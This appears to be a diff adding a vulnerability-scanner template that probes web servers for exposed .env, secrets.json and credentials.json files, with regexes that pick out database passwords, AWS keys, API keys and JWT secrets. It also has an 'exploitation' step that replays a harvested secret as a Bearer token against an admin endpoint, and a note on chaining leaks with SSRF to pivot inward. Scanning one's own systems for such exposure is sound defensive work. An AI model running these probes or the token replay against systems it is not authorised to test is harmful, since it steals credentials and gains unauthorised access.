@@ -1,0 +1,90 @@
+id: env-exposure-god
+name: Environment File Exposure – God Level
+severity: low
+impact: Leaked credentials, API keys, and database passwords can lead to full system compromise.
+chain: Combine leaked secrets with SSRF to pivot into internal networks.
+
+requests:
+  # 1. Common .env paths
+  - method: GET
+    path:
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.env.production"
+      - "{{BaseURL}}/.env.local"
+      - "{{BaseURL}}/.env.backup"
+      - "{{BaseURL}}/.env.old"
+      - "{{BaseURL}}/.env.staging"
+      - "{{BaseURL}}/.env.test"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: text/plain
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<html"
+          - "<!DOCTYPE"
+      - type: regex
+        part: body
+        regex:
+          - 'DB_(?:HOST|NAME|USER|PASSWORD|PORT|DATABASE)\s*[:=]\s*\S+'
+          - 'AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)\s*[:=]\s*\S+'
+          - 'SECRET(?:_KEY|_TOKEN)?\s*[:=]\s*\S+'
+          - 'API_KEY\s*[:=]\s*\S+'
+          - 'JWT_SECRET\s*[:=]\s*\S+'
+          - 'REDIS_(?:HOST|PASSWORD)\s*[:=]\s*\S+'
+          - 'MONGO_(?:URI|DB)\s*[:=]\s*\S+'
+          - 'SMTP_.+[:=]\s*\S+'
+    extractors:
+      - type: regex
+        name: leaked_secret
+        regex:
+          - '((?:DB_|AWS_|SECRET|API_KEY|JWT_SECRET|REDIS_|MONGO_|SMTP_).+\s*[:=]\s*[^\s]+)'
+
+  # 2. Alternative formats (JSON, properties)
+  - method: GET
+    path:
+      - "{{BaseURL}}/appsettings.json"
+      - "{{BaseURL}}/config/application.properties"
+      - "{{BaseURL}}/secrets.json"
+      - "{{BaseURL}}/credentials.json"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: regex
+        part: body
+        regex:
+          - '"password":\s*"[^"]+"'
+          - '"secret":\s*"[^"]+"'
+          - '"api_key":\s*"[^"]+"'
+
+verification:
+  # Confirm the file contains actual environment variables
+  - method: GET
+    path: "{{BaseURL}}/.env"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: text/plain
+      - type: regex
+        part: body
+        regex:
+          - '='  # must contain at least one '=' sign
+
+exploitation:
+  # Attempt to use a leaked secret to access an admin endpoint (example)
+  - method: GET
+    path: "{{BaseURL}}/api/admin"
+    headers:
+      Authorization: "Bearer {{leaked_secret}}"
+    extract:
+      type: status
+      expected: 200
